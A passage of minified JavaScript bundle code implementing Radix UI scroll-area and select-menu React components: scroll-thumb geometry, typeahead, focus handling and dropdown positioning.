      , {onThumbPositionChange: X} = b
      , Y = useComposedRefs(M, K => b.onThumbChange(K))
      , F = reactExports.useRef(void 0)
      , V = useDebounceCallback( () => {
        F.current && (F.current(),
        F.current = void 0)
    }
    , 100);
    return reactExports.useEffect( () => {
        const K = w.viewport;
        if (K) {
            const Q = () => {
                if (V(),
                !F.current) {
                    const ee = addUnlinkedScrollListener(K, X);
                    F.current = ee,
                    X()
                }
            }
            ;
            return X(),
            K.addEventListener("scroll", Q),
            () => K.removeEventListener("scroll", Q)
        }
    }
    , [w.viewport, V, X]),
    jsxRuntimeExports.jsx(Primitive$1.div, {
        "data-state": b.hasThumb ? "visible" : "hidden",
        ...x,
        ref: Y,
        style: {
            width: "var(--radix-scroll-area-thumb-width)",
            height: "var(--radix-scroll-area-thumb-height)",
            ...O
        },
        onPointerDownCapture: composeEventHandlers$1(_.onPointerDownCapture, K => {
            const ee = K.target.getBoundingClientRect()
              , ae = K.clientX - ee.left
              , ne = K.clientY - ee.top;
            b.onThumbPointerDown({
                x: ae,
                y: ne
            })
        }
        ),
        onPointerUp: composeEventHandlers$1(_.onPointerUp, b.onThumbPointerUp)
    })
}
);
ScrollAreaThumb.displayName = THUMB_NAME;
var CORNER_NAME = "ScrollAreaCorner"
  , ScrollAreaCorner = reactExports.forwardRef( (_, M) => {
    const j = useScrollAreaContext(CORNER_NAME, _.__scopeScrollArea)
      , O = !!(j.scrollbarX && j.scrollbarY);
    return j.type !== "scroll" && O ? jsxRuntimeExports.jsx(ScrollAreaCornerImpl, {
        ..._,
        ref: M
    }) : null
}
);
ScrollAreaCorner.displayName = CORNER_NAME;
var ScrollAreaCornerImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeScrollArea: j, ...O} = _
      , x = useScrollAreaContext(CORNER_NAME, j)
      , [w,b] = reactExports.useState(0)
      , [X,Y] = reactExports.useState(0)
      , F = !!(w && X);
    return useResizeObserver(x.scrollbarX, () => {
        var K;
        const V = ((K = x.scrollbarX) == null ? void 0 : K.offsetHeight) || 0;
        x.onCornerHeightChange(V),
        Y(V)
    }
    ),
    useResizeObserver(x.scrollbarY, () => {
        var K;
        const V = ((K = x.scrollbarY) == null ? void 0 : K.offsetWidth) || 0;
        x.onCornerWidthChange(V),
        b(V)
    }
    ),
    F ? jsxRuntimeExports.jsx(Primitive$1.div, {
        ...O,
        ref: M,
        style: {
            width: w,
            height: X,
            position: "absolute",
            right: x.dir === "ltr" ? 0 : void 0,
            left: x.dir === "rtl" ? 0 : void 0,
            bottom: 0,
            ..._.style
        }
    }) : null
}
);
function toInt(_) {
    return _ ? parseInt(_, 10) : 0
}
function getThumbRatio(_, M) {
    const j = _ / M;
    return isNaN(j) ? 0 : j
}
function getThumbSize(_) {
    const M = getThumbRatio(_.viewport, _.content)
      , j = _.scrollbar.paddingStart + _.scrollbar.paddingEnd
      , O = (_.scrollbar.size - j) * M;
    return Math.max(O, 18)
}
function getScrollPositionFromPointer(_, M, j, O="ltr") {
    const x = getThumbSize(j)
      , w = x / 2
      , b = M || w
      , X = x - b
      , Y = j.scrollbar.paddingStart + b
      , F = j.scrollbar.size - j.scrollbar.paddingEnd - X
      , V = j.content - j.viewport
      , K = O === "ltr" ? [0, V] : [V * -1, 0];
    return linearScale([Y, F], K)(_)
}
function getThumbOffsetFromScroll(_, M, j="ltr") {
    const O = getThumbSize(M)
      , x = M.scrollbar.paddingStart + M.scrollbar.paddingEnd
      , w = M.scrollbar.size - x
      , b = M.content - M.viewport
      , X = w - O
      , Y = j === "ltr" ? [0, b] : [b * -1, 0]
      , F = clamp(_, Y);
    return linearScale([0, b], [0, X])(F)
}
function linearScale(_, M) {
    return j => {
        if (_[0] === _[1] || M[0] === M[1])
            return M[0];
        const O = (M[1] - M[0]) / (_[1] - _[0]);
        return M[0] + O * (j - _[0])
    }
}
function isScrollingWithinScrollbarBounds(_, M) {
    return _ > 0 && _ < M
}
var addUnlinkedScrollListener = (_, M= () => {}
) => {
    let j = {
        left: _.scrollLeft,
        top: _.scrollTop
    }
      , O = 0;
    return function x() {
        const w = {
            left: _.scrollLeft,
            top: _.scrollTop
        }
          , b = j.left !== w.left
          , X = j.top !== w.top;
        (b || X) && M(),
        j = w,
        O = window.requestAnimationFrame(x)
    }(),
    () => window.cancelAnimationFrame(O)
}
;
function useDebounceCallback(_, M) {
    const j = useCallbackRef$1(_)
      , O = reactExports.useRef(0);
    return reactExports.useEffect( () => () => window.clearTimeout(O.current), []),
    reactExports.useCallback( () => {
        window.clearTimeout(O.current),
        O.current = window.setTimeout(j, M)
    }
    , [j, M])
}
function useResizeObserver(_, M) {
    const j = useCallbackRef$1(M);
    useLayoutEffect2( () => {
        let O = 0;
        if (_) {
            const x = new ResizeObserver( () => {
                cancelAnimationFrame(O),
                O = window.requestAnimationFrame(j)
            }
            );
            return x.observe(_),
            () => {
                window.cancelAnimationFrame(O),
                x.unobserve(_)
            }
        }
    }
    , [_, j])
}
var Root = ScrollArea
  , Viewport$1 = ScrollAreaViewport
  , Scrollbar = ScrollAreaScrollbar
  , Thumb = ScrollAreaThumb
  , Corner = ScrollAreaCorner
  , OPEN_KEYS = [" ", "Enter", "ArrowUp", "ArrowDown"]
  , SELECTION_KEYS = [" ", "Enter"]
  , SELECT_NAME = "Select"
  , [Collection,useCollection,createCollectionScope] = createCollection(SELECT_NAME)
  , [createSelectContext,createSelectScope] = createContextScope(SELECT_NAME, [createCollectionScope, createPopperScope])
  , usePopperScope$1 = createPopperScope()
  , [SelectProvider,useSelectContext] = createSelectContext(SELECT_NAME)
  , [SelectNativeOptionsProvider,useSelectNativeOptionsContext] = createSelectContext(SELECT_NAME)
  , Select = _ => {
    const {__scopeSelect: M, children: j, open: O, defaultOpen: x, onOpenChange: w, value: b, defaultValue: X, onValueChange: Y, dir: F, name: V, autoComplete: K, disabled: Q, required: ee, form: ae} = _
      , ne = usePopperScope$1(M)
      , [oe,ue] = reactExports.useState(null)
      , [fe,he] = reactExports.useState(null)
      , [pe,ye] = reactExports.useState(!1)
      , be = useDirection(F)
      , [xe,Ae] = useControllableState({
        prop: O,
        defaultProp: x ?? !1,
        onChange: w,
        caller: SELECT_NAME
    })
      , [Ee,Be] = useControllableState({
        prop: b,
        defaultProp: X,
        onChange: Y,
        caller: SELECT_NAME
    })
      , ce = reactExports.useRef(null)
      , q = oe ? ae || !!oe.closest("form") : !0
      , [L,U] = reactExports.useState(new Set)
      , Z = Array.from(L).map(te => te.props.value).join(";");
    return jsxRuntimeExports.jsx(Root2$1, {
        ...ne,
        children: jsxRuntimeExports.jsxs(SelectProvider, {
            required: ee,
            scope: M,
            trigger: oe,
            onTriggerChange: ue,
            valueNode: fe,
            onValueNodeChange: he,
            valueNodeHasChildren: pe,
            onValueNodeHasChildrenChange: ye,
            contentId: useId(),
            value: Ee,
            onValueChange: Be,
            open: xe,
            onOpenChange: Ae,
            dir: be,
            triggerPointerDownPosRef: ce,
            disabled: Q,
            children: [jsxRuntimeExports.jsx(Collection.Provider, {
                scope: M,
                children: jsxRuntimeExports.jsx(SelectNativeOptionsProvider, {
                    scope: _.__scopeSelect,
                    onNativeOptionAdd: reactExports.useCallback(te => {
                        U(se => new Set(se).add(te))
                    }
                    , []),
                    onNativeOptionRemove: reactExports.useCallback(te => {
                        U(se => {
                            const de = new Set(se);
                            return de.delete(te),
                            de
                        }
                        )
                    }
                    , []),
                    children: j
                })
            }), q ? jsxRuntimeExports.jsxs(SelectBubbleInput, {
                "aria-hidden": !0,
                required: ee,
                tabIndex: -1,
                name: V,
                autoComplete: K,
                value: Ee,
                onChange: te => Be(te.target.value),
                disabled: Q,
                form: ae,
                children: [Ee === void 0 ? jsxRuntimeExports.jsx("option", {
                    value: ""
                }) : null, Array.from(L)]
            }, Z) : null]
        })
    })
}
;
Select.displayName = SELECT_NAME;
var TRIGGER_NAME$1 = "SelectTrigger"
  , SelectTrigger = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, disabled: O=!1, ...x} = _
      , w = usePopperScope$1(j)
      , b = useSelectContext(TRIGGER_NAME$1, j)
      , X = b.disabled || O
      , Y = useComposedRefs(M, b.onTriggerChange)
      , F = useCollection(j)
      , V = reactExports.useRef("touch")
      , [K,Q,ee] = useTypeaheadSearch(ne => {
        const oe = F().filter(he => !he.disabled)
          , ue = oe.find(he => he.value === b.value)
          , fe = findNextItem(oe, ne, ue);
        fe !== void 0 && b.onValueChange(fe.value)
    }
    )
      , ae = ne => {
        X || (b.onOpenChange(!0),
        ee()),
        ne && (b.triggerPointerDownPosRef.current = {
            x: Math.round(ne.pageX),
            y: Math.round(ne.pageY)
        })
    }
    ;
    return jsxRuntimeExports.jsx(Anchor, {
        asChild: !0,
        ...w,
        children: jsxRuntimeExports.jsx(Primitive$1.button, {
            type: "button",
            role: "combobox",
            "aria-controls": b.contentId,
            "aria-expanded": b.open,
            "aria-required": b.required,
            "aria-autocomplete": "none",
            dir: b.dir,
            "data-state": b.open ? "open" : "closed",
            disabled: X,
            "data-disabled": X ? "" : void 0,
            "data-placeholder": shouldShowPlaceholder(b.value) ? "" : void 0,
            ...x,
            ref: Y,
            onClick: composeEventHandlers$1(x.onClick, ne => {
                ne.currentTarget.focus(),
                V.current !== "mouse" && ae(ne)
            }
            ),
            onPointerDown: composeEventHandlers$1(x.onPointerDown, ne => {
                V.current = ne.pointerType;
                const oe = ne.target;
                oe.hasPointerCapture(ne.pointerId) && oe.releasePointerCapture(ne.pointerId),
                ne.button === 0 && ne.ctrlKey === !1 && ne.pointerType === "mouse" && (ae(ne),
                ne.preventDefault())
            }
            ),
            onKeyDown: composeEventHandlers$1(x.onKeyDown, ne => {
                const oe = K.current !== "";
                !(ne.ctrlKey || ne.altKey || ne.metaKey) && ne.key.length === 1 && Q(ne.key),
                !(oe && ne.key === " ") && OPEN_KEYS.includes(ne.key) && (ae(),
                ne.preventDefault())
            }
            )
        })
    })
}
);
SelectTrigger.displayName = TRIGGER_NAME$1;
var VALUE_NAME = "SelectValue"
  , SelectValue = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, className: O, style: x, children: w, placeholder: b="", ...X} = _
      , Y = useSelectContext(VALUE_NAME, j)
      , {onValueNodeHasChildrenChange: F} = Y
      , V = w !== void 0
      , K = useComposedRefs(M, Y.onValueNodeChange);
    return useLayoutEffect2( () => {
        F(V)
    }
    , [F, V]),
    jsxRuntimeExports.jsx(Primitive$1.span, {
        ...X,
        ref: K,
        style: {
            pointerEvents: "none"
        },
        children: shouldShowPlaceholder(Y.value) ? jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: b
        }) : w
    })
}
);
SelectValue.displayName = VALUE_NAME;
var ICON_NAME = "SelectIcon"
  , SelectIcon = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, children: O, ...x} = _;
    return jsxRuntimeExports.jsx(Primitive$1.span, {
        "aria-hidden": !0,
        ...x,
        ref: M,
        children: O || ""
    })
}
);
SelectIcon.displayName = ICON_NAME;
var PORTAL_NAME$1 = "SelectPortal"
  , SelectPortal = _ => jsxRuntimeExports.jsx(Portal$4, {
    asChild: !0,
    ..._
});
SelectPortal.displayName = PORTAL_NAME$1;
var CONTENT_NAME$1 = "SelectContent"
  , SelectContent = reactExports.forwardRef( (_, M) => {
    const j = useSelectContext(CONTENT_NAME$1, _.__scopeSelect)
      , [O,x] = reactExports.useState();
    if (useLayoutEffect2( () => {
        x(new DocumentFragment)
    }
    , []),
    !j.open) {
        const w = O;
        return w ? reactDomExports.createPortal(jsxRuntimeExports.jsx(SelectContentProvider, {
            scope: _.__scopeSelect,
            children: jsxRuntimeExports.jsx(Collection.Slot, {
                scope: _.__scopeSelect,
                children: jsxRuntimeExports.jsx("div", {
                    children: _.children
                })
            })
        }), w) : null
    }
    return jsxRuntimeExports.jsx(SelectContentImpl, {
        ..._,
        ref: M
    })
}
);
SelectContent.displayName = CONTENT_NAME$1;
var CONTENT_MARGIN = 10
  , [SelectContentProvider,useSelectContentContext] = createSelectContext(CONTENT_NAME$1)
  , CONTENT_IMPL_NAME = "SelectContentImpl"
  , Slot = createSlot("SelectContent.RemoveScroll")
  , SelectContentImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, position: O="item-aligned", onCloseAutoFocus: x, onEscapeKeyDown: w, onPointerDownOutside: b, side: X, sideOffset: Y, align: F, alignOffset: V, arrowPadding: K, collisionBoundary: Q, collisionPadding: ee, sticky: ae, hideWhenDetached: ne, avoidCollisions: oe, ...ue} = _
      , fe = useSelectContext(CONTENT_NAME$1, j)
      , [he,pe] = reactExports.useState(null)
      , [ye,be] = reactExports.useState(null)
      , xe = useComposedRefs(M, Te => pe(Te))
      , [Ae,Ee] = reactExports.useState(null)
      , [Be,ce] = reactExports.useState(null)
      , q = useCollection(j)
      , [L,U] = reactExports.useState(!1)
      , Z = reactExports.useRef(!1);
    reactExports.useEffect( () => {
        if (he)
            return hideOthers(he)
    }
    , [he]),
    useFocusGuards();
    const te = reactExports.useCallback(Te => {
        const [Le,...Ze] = q().map(qe => qe.ref.current)
          , [$e] = Ze.slice(-1)
          , Ne = document.activeElement;
        for (const qe of Te)
            if (qe === Ne || (qe == null || qe.scrollIntoView({
                block: "nearest"
            }),
            qe === Le && ye && (ye.scrollTop = 0),
            qe === $e && ye && (ye.scrollTop = ye.scrollHeight),
            qe == null || qe.focus(),
            document.activeElement !== Ne))
                return
    }
    , [q, ye])
      , se = reactExports.useCallback( () => te([Ae, he]), [te, Ae, he]);
    reactExports.useEffect( () => {
        L && se()
    }
    , [L, se]);
    const {onOpenChange: de, triggerPointerDownPosRef: re} = fe;
    reactExports.useEffect( () => {
        if (he) {
            let Te = {
                x: 0,
                y: 0
            };
            const Le = $e => {
                var Ne, qe;
                Te = {
                    x: Math.abs(Math.round($e.pageX) - (((Ne = re.current) == null ? void 0 : Ne.x) ?? 0)),
                    y: Math.abs(Math.round($e.pageY) - (((qe = re.current) == null ? void 0 : qe.y) ?? 0))
                }
            }
              , Ze = $e => {
                Te.x <= 10 && Te.y <= 10 ? $e.preventDefault() : he.contains($e.target) || de(!1),
                document.removeEventListener("pointermove", Le),
                re.current = null
            }
            ;
            return re.current !== null && (document.addEventListener("pointermove", Le),
            document.addEventListener("pointerup", Ze, {
                capture: !0,
                once: !0
            })),
            () => {
                document.removeEventListener("pointermove", Le),
                document.removeEventListener("pointerup", Ze, {
                    capture: !0
                })
            }
        }
    }
    , [he, de, re]),
    reactExports.useEffect( () => {
        const Te = () => de(!1);
        return window.addEventListener("blur", Te),
        window.addEventListener("resize", Te),
        () => {
            window.removeEventListener("blur", Te),
            window.removeEventListener("resize", Te)
        }
    }
    , [de]);
    const [$,ie] = useTypeaheadSearch(Te => {
        const Le = q().filter(Ne => !Ne.disabled)
          , Ze = Le.find(Ne => Ne.ref.current === document.activeElement)
          , $e = findNextItem(Le, Te, Ze);
        $e && setTimeout( () => $e.ref.current.focus())
    }
    )
      , ve = reactExports.useCallback( (Te, Le, Ze) => {
        const $e = !Z.current && !Ze;
        (fe.value !== void 0 && fe.value === Le || $e) && (Ee(Te),
        $e && (Z.current = !0))
    }
    , [fe.value])
      , ge = reactExports.useCallback( () => he == null ? void 0 : he.focus(), [he])
      , Re = reactExports.useCallback( (Te, Le, Ze) => {
        const $e = !Z.current && !Ze;
        (fe.value !== void 0 && fe.value === Le || $e) && ce(Te)
    }
    , [fe.value])
      , Pe = O === "popper" ? SelectPopperPosition : SelectItemAlignedPosition
      , Ie = Pe === SelectPopperPosition ? {
        side: X,
        sideOffset: Y,
        align: F,
        alignOffset: V,
        arrowPadding: K,
        collisionBoundary: Q,
        collisionPadding: ee,
        sticky: ae,
        hideWhenDetached: ne,
        avoidCollisions: oe
    } : {};
    return jsxRuntimeExports.jsx(SelectContentProvider, {
        scope: j,
        content: he,
        viewport: ye,
        onViewportChange: be,
        itemRefCallback: ve,
        selectedItem: Ae,
        onItemLeave: ge,
        itemTextRefCallback: Re,
        focusSelectedItem: se,
        selectedItemText: Be,
        position: O,
        isPositioned: L,
        searchRef: $,
        children: jsxRuntimeExports.jsx(ReactRemoveScroll, {
            as: Slot,
            allowPinchZoom: !0,
            children: jsxRuntimeExports.jsx(FocusScope, {
                asChild: !0,
                trapped: fe.open,
                onMountAutoFocus: Te => {
                    Te.preventDefault()
                }
                ,
                onUnmountAutoFocus: composeEventHandlers$1(x, Te => {
                    var Le;
                    (Le = fe.trigger) == null || Le.focus({
                        preventScroll: !0
                    }),
                    Te.preventDefault()
                }
                ),
                children: jsxRuntimeExports.jsx(DismissableLayer, {
                    asChild: !0,
                    disableOutsidePointerEvents: !0,
                    onEscapeKeyDown: w,
                    onPointerDownOutside: b,
                    onFocusOutside: Te => Te.preventDefault(),
                    onDismiss: () => fe.onOpenChange(!1),
                    children: jsxRuntimeExports.jsx(Pe, {
                        role: "listbox",
                        id: fe.contentId,
                        "data-state": fe.open ? "open" : "closed",
                        dir: fe.dir,
                        onContextMenu: Te => Te.preventDefault(),
                        ...ue,
                        ...Ie,
                        onPlaced: () => U(!0),
                        ref: xe,
                        style: {
                            display: "flex",
                            flexDirection: "column",
                            outline: "none",
                            ...ue.style
                        },
                        onKeyDown: composeEventHandlers$1(ue.onKeyDown, Te => {
                            const Le = Te.ctrlKey || Te.altKey || Te.metaKey;
                            if (Te.key === "Tab" && Te.preventDefault(),
                            !Le && Te.key.length === 1 && ie(Te.key),
                            ["ArrowUp", "ArrowDown", "Home", "End"].includes(Te.key)) {
                                let $e = q().filter(Ne => !Ne.disabled).map(Ne => Ne.ref.current);
                                if (["ArrowUp", "End"].includes(Te.key) && ($e = $e.slice().reverse()),
                                ["ArrowUp", "ArrowDown"].includes(Te.key)) {
                                    const Ne = Te.target
                                      , qe = $e.indexOf(Ne);
                                    $e = $e.slice(qe + 1)
                                }
                                setTimeout( () => te($e)),
                                Te.preventDefault()
                            }
                        }
                        )
                    })
                })
            })
        })
    })
}
);
SelectContentImpl.displayName = CONTENT_IMPL_NAME;
var ITEM_ALIGNED_POSITION_NAME = "SelectItemAlignedPosition"
  , SelectItemAlignedPosition = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, onPlaced: O, ...x} = _
      , w = useSelectContext(CONTENT_NAME$1, j)
      , b = useSelectContentContext(CONTENT_NAME$1, j)
      , [X,Y] = reactExports.useState(null)
      , [F,V] = reactExports.useState(null)
      , K = useComposedRefs(M, xe => V(xe))
      , Q = useCollection(j)
      , ee = reactExports.useRef(!1)
      , ae = reactExports.useRef(!0)
      , {viewport: ne, selectedItem: oe, selectedItemText: ue, focusSelectedItem: fe} = b
      , he = reactExports.useCallback( () => {
        if (w.trigger && w.valueNode && X && F && ne && oe && ue) {
            const xe = w.trigger.getBoundingClientRect()
              , Ae = F.getBoundingClientRect()
              , Ee = w.valueNode.getBoundingClientRect()
              , Be = ue.getBoundingClientRect();
            if (w.dir !== "rtl") {
                const Ne = Be.left - Ae.left
                  , qe = Ee.left - Ne
                  , Ve = xe.left - qe
                  , lt = xe.width + Ve
                  , nt = Math.max(lt, Ae.width)
                  , je = window.innerWidth - CONTENT_MARGIN
                  , Ke = clamp(qe, [CONTENT_MARGIN, Math.max(CONTENT_MARGIN, je - nt)]);
                X.style.minWidth = lt + "px",
                X.style.left = Ke + "px"
            } else {
                const Ne = Ae.right - Be.right
                  , qe = window.innerWidth - Ee.right - Ne
                  , Ve = window.innerWidth - xe.right - qe
                  , lt = xe.width + Ve
                  , nt = Math.max(lt, Ae.width)
                  , je = window.innerWidth - CONTENT_MARGIN
                  , Ke = clamp(qe, [CONTENT_MARGIN, Math.max(CONTENT_MARGIN, je - nt)]);
                X.style.minWidth = lt + "px",
                X.style.right = Ke + "px"
            }
            const ce = Q()
              , q = window.innerHeight - CONTENT_MARGIN * 2
              , L = ne.scrollHeight
              , U = window.getComputedStyle(F)
              , Z = parseInt(U.borderTopWidth, 10)
              , te = parseInt(U.paddingTop, 10)
              , se = parseInt(U.borderBottomWidth, 10)
              , de = parseInt(U.paddingBottom, 10)
              , re = Z + te + L + de + se
              , $ = Math.min(oe.offsetHeight * 5, re)
              , ie = window.getComputedStyle(ne)
              , ve = parseInt(ie.paddingTop, 10)
              , ge = parseInt(ie.paddingBottom, 10)
              , Re = xe.top + xe.height / 2 - CONTENT_MARGIN
              , Pe = q - Re
              , Ie = oe.offsetHeight / 2
              , Te = oe.offsetTop + Ie
              , Le = Z + te + Te
              , Ze = re - Le;
            if (Le <= Re) {
                const Ne = ce.length > 0 && oe === ce[ce.length - 1].ref.current;
                X.style.bottom = "0px";
                const qe = F.clientHeight - ne.offsetTop - ne.offsetHeight
                  , Ve = Math.max(Pe, Ie + (Ne ? ge : 0) + qe + se)
                  , lt = Le + Ve;
                X.style.height = lt + "px"
            } else {
                const Ne = ce.length > 0 && oe === ce[0].ref.current;
                X.style.top = "0px";
                const Ve = Math.max(Re, Z + ne.offsetTop + (Ne ? ve : 0) + Ie) + Ze;
                X.style.height = Ve + "px",
                ne.scrollTop = Le - Re + ne.offsetTop
            }
            X.style.margin = `${CONTENT_MARGIN}px 0`,
            X.style.minHeight = $ + "px",
            X.style.maxHeight = q + "px",
            O == null || O(),
            requestAnimationFrame( () => ee.current = !0)
        }
    }
    , [Q, w.trigger, w.valueNode, X, F, ne, oe, ue, w.dir, O]);
    useLayoutEffect2( () => he(), [he]);
    const [pe,ye] = reactExports.useState();
    useLayoutEffect2( () => {
        F && ye(window.getComputedStyle(F).zIndex)
    }
    , [F]);
    const be = reactExports.useCallback(xe => {
        xe && ae.current === !0 && (he(),
        fe == null || fe(),
        ae.current = !1)
    }
    , [he, fe]);
    return jsxRuntimeExports.jsx(SelectViewportProvider, {
        scope: j,
        contentWrapper: X,
        shouldExpandOnScrollRef: ee,
        onScrollButtonChange: be,
        children: jsxRuntimeExports.jsx("div", {
            ref: Y,
            style: {
                display: "flex",
                flexDirection: "column",
                position: "fixed",
                zIndex: pe
            },
            children: jsxRuntimeExports.jsx(Primitive$1.div, {
                ...x,
                ref: K,
                style: {
                    boxSizing: "border-box",
                    maxHeight: "100%",
                    ...x.style
                }
            })
        })
    })
}
);
SelectItemAlignedPosition.displayName = ITEM_ALIGNED_POSITION_NAME;
var POPPER_POSITION_NAME = "SelectPopperPosition"
  , SelectPopperPosition = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, align: O="start", collisionPadding: x=CONTENT_MARGIN, ...w} = _
      , b = usePopperScope$1(j);
    return jsxRuntimeExports.jsx(Content, {
        ...b,
        ...w,
        ref: M,
        align: O,
        collisionPadding: x,
        style: {
            boxSizing: "border-box",
            ...w.style,
            "--radix-select-content-transform-origin": "var(--radix-popper-transform-origin)",
            "--radix-select-content-available-width": "var(--radix-popper-available-width)",
            "--radix-select-content-available-height": "var(--radix-popper-available-height)",
            "--radix-select-trigger-width": "var(--radix-popper-anchor-width)",
            "--radix-select-trigger-height": "var(--radix-popper-anchor-height)"
        }
    })
}
);
SelectPopperPosition.displayName = POPPER_POSITION_NAME;
var [SelectViewportProvider,useSelectViewportContext] = createSelectContext(CONTENT_NAME$1, {})
  , VIEWPORT_NAME = "SelectViewport"
  , SelectViewport = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, nonce: O, ...x} = _
      , w = useSelectContentContext(VIEWPORT_NAME, j)
      , b = useSelectViewportContext(VIEWPORT_NAME, j)
      , X = useComposedRefs(M, w.onViewportChange)
      , Y = reactExports.useRef(0);
    return jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
        children: [jsxRuntimeExports.jsx("style", {
            dangerouslySetInnerHTML: {
                __html: "[data-radix-select-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-select-viewport]::-webkit-scrollbar{display:none}"
            },
            nonce: O
        }), jsxRuntimeExports.jsx(Collection.Slot, {
            scope: j,
            children: jsxRuntimeExports.jsx(Primitive$1.div, {
                "data-radix-select-viewport": "",
                role: "presentation",
                ...x,
                ref: X,
                style: {
                    position: "relative",
                    flex: 1,
                    overflow: "hidden auto",
                    ...x.style
                },
                onScroll: composeEventHandlers$1(x.onScroll, F => {
                    const V = F.currentTarget
                      , {contentWrapper: K, shouldExpandOnScrollRef: Q} = b;
                    if (Q != null && Q.current && K) {
                        const ee = Math.abs(Y.current - V.scrollTop);
                        if (ee > 0) {
                            const ae = window.innerHeight - CONTENT_MARGIN * 2
                              , ne = parseFloat(K.style.minHeight)
                              , oe = parseFloat(K.style.height)
                              , ue = Math.max(ne, oe);
                            if (ue < ae) {
                                const fe = ue + ee
                                  , he = Math.min(ae, fe)
                                  , pe = fe - he;
                                K.style.height = he + "px",
                                K.style.bottom === "0px" && (V.scrollTop = pe > 0 ? pe : 0,
                                K.style.justifyContent = "flex-end")
                            }
                        }
                    }
                    Y.current = V.scrollTop
                }
                )
            })
        })]
    })
}
);
SelectViewport.displayName = VIEWPORT_NAME;
var GROUP_NAME = "SelectGroup"
  , [SelectGroupContextProvider,useSelectGroupContext] = createSelectContext(GROUP_NAME)
  , SelectGroup = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, ...O} = _
      , x = useId();
    return jsxRuntimeExports.jsx(SelectGroupContextProvider, {
        scope: j,
        id: x,
        children: jsxRuntimeExports.jsx(Primitive$1.div, {
            role: "group",
            "aria-labelledby": x,
            ...O,
            ref: M
        })
    })
}
);
SelectGroup.displayName = GROUP_NAME;
var LABEL_NAME = "SelectLabel"
  , SelectLabel = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, ...O} = _
      , x = useSelectGroupContext(LABEL_NAME, j);
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        id: x.id,
        ...O,
        ref: M
    })
}
);
SelectLabel.displayName = LABEL_NAME;
var ITEM_NAME = "SelectItem"
  , [SelectItemContextProvider,useSelectItemContext] = createSelectContext(ITEM_NAME)
  , SelectItem = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, value: O, disabled: x=!1, textValue: w, ...b} = _
      , X = useSelectContext(ITEM_NAME, j)
      , Y = useSelectContentContext(ITEM_NAME, j)
      , F = X.value === O
      , [V,K] = reactExports.useState(w ?? "")
      , [Q,ee] = reactExports.useState(!1)
      , ae = useComposedRefs(M, fe => {
        var he;
        return (he = Y.itemRefCallback) == null ? void 0 : he.call(Y, fe, O, x)
    }
    )
      , ne = useId()
      , oe = reactExports.useRef("touch")
      , ue = () => {
        x || (X.onValueChange(O),
        X.onOpenChange(!1))
    }
    ;
    if (O === "")
        throw new Error("A <Select.Item /> must have a value prop that is not an empty string. This is because the Select value can be set to an empty string to clear the selection and show the placeholder.");
    return jsxRuntimeExports.jsx(SelectItemContextProvider, {
        scope: j,
        value: O,
        disabled: x,
        textId: ne,
        isSelected: F,
        onItemTextChange: reactExports.useCallback(fe => {
            K(he => he || ((fe == null ? void 0 : fe.textContent) ?? "").trim())
        }
        , []),
        children: jsxRuntimeExports.jsx(Collection.ItemSlot, {
            scope: j,
            value: O,
            disabled: x,
            textValue: V,
            children: jsxRuntimeExports.jsx(Primitive$1.div, {
                role: "option",
                "aria-labelledby": ne,
                "data-highlighted": Q ? "" : void 0,
                "aria-selected": F && Q,
                "data-state": F ? "checked" : "unchecked",
                "aria-disabled": x || void 0,
                "data-disabled": x ? "" : void 0,
                tabIndex: x ? void 0 : -1,
                ...b,
                ref: ae,
                onFocus: composeEventHandlers$1(b.onFocus, () => ee(!0)),
                onBlur: composeEventHandlers$1(b.onBlur, () => ee(!1)),
                onClick: composeEventHandlers$1(b.onClick, () => {
                    oe.current !== "mouse" && ue()
                }
                ),
                onPointerUp: composeEventHandlers$1(b.onPointerUp, () => {
                    oe.current === "mouse" && ue()
                }
                ),
                onPointerDown: composeEventHandlers$1(b.onPointerDown, fe => {
                    oe.current = fe.pointerType
                }
                ),
                onPointerMove: composeEventHandlers$1(b.onPointerMove, fe => {
                    var he;
                    oe.current = fe.pointerType,
                    x ? (he = Y.onItemLeave) == null || he.call(Y) : oe.current === "mouse" && fe.currentTarget.focus({
                        preventScroll: !0
                    })
                }
                ),
                onPointerLeave: composeEventHandlers$1(b.onPointerLeave, fe => {
                    var he;
                    fe.currentTarget === document.activeElement && ((he = Y.onItemLeave) == null || he.call(Y))
                }
                ),
                onKeyDown: composeEventHandlers$1(b.onKeyDown, fe => {
                    var pe;
                    ((pe = Y.searchRef) == null ? void 0 : pe.current) !== "" && fe.key === " " || (SELECTION_KEYS.includes(fe.key) && ue(),
                    fe.key === " " && fe.preventDefault())
                }
                )
            })
        })
    })
}
);
SelectItem.displayName = ITEM_NAME;
var ITEM_TEXT_NAME = "SelectItemText"
  , SelectItemText = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, className: O, style: x, ...w} = _
      , b = useSelectContext(ITEM_TEXT_NAME, j)
      , X = useSelectContentContext(ITEM_TEXT_NAME, j)
      , Y = useSelectItemContext(ITEM_TEXT_NAME, j)
      , F = useSelectNativeOptionsContext(ITEM_TEXT_NAME, j)
      , [V,K] = reactExports.useState(null)
      , Q = useComposedRefs(M, ue => K(ue), Y.onItemTextChange, ue => {
        var fe;
        return (fe = X.itemTextRefCallback) == null ? void 0 : fe.call(X, ue, Y.value, Y.disabled)
    }
    )
      , ee = V == null ? void 0 : V.textContent
      , ae = reactExports.useMemo( () => jsxRuntimeExports.jsx("option", {
        value: Y.value,
        disabled: Y.disabled,
        children: ee
    }, Y.value), [Y.disabled, Y.value, ee])
      , {onNativeOptionAdd: ne, onNativeOptionRemove: oe} = F;
    return useLayoutEffect2( () => (ne(ae),
    () => oe(ae)), [ne, oe, ae]),
    jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
        children: [jsxRuntimeExports.jsx(Primitive$1.span, {
